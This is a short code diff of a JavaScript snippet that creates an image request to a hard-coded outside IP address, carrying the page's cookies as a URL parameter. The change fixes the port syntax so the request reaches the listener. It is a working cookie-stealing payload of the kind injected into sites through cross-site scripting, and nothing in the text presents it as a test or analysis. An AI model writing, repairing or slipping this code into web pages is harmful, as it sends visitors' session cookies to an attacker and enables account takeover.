@@ -1,2 +1,2 @@
 var img = new Image();
-  img.src = 'http://49.13.194.218/8080/log?cookie=' + encodeURIComponent(document.cookie);
+  img.src = 'http://49.13.194.218:8080/log?cookie=' + encodeURIComponent(document.cookie);
